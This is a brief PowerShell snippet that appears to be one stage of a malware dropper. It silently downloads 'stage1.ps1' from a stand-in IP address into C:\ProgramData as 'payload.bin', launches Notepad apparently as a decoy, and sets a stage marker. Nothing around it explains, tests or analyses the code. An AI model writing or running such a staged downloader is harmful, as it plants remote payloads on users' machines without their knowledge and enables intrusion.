
$RemoteUrl = 'http://203.0.113.78/stage1.ps1'
$WorkingPath = "C:\ProgramData\payload.bin"
curl.exe -s -L -o $WorkingPath $RemoteUrl
& "notepad.exe"
$StageMarker = "stage-5"
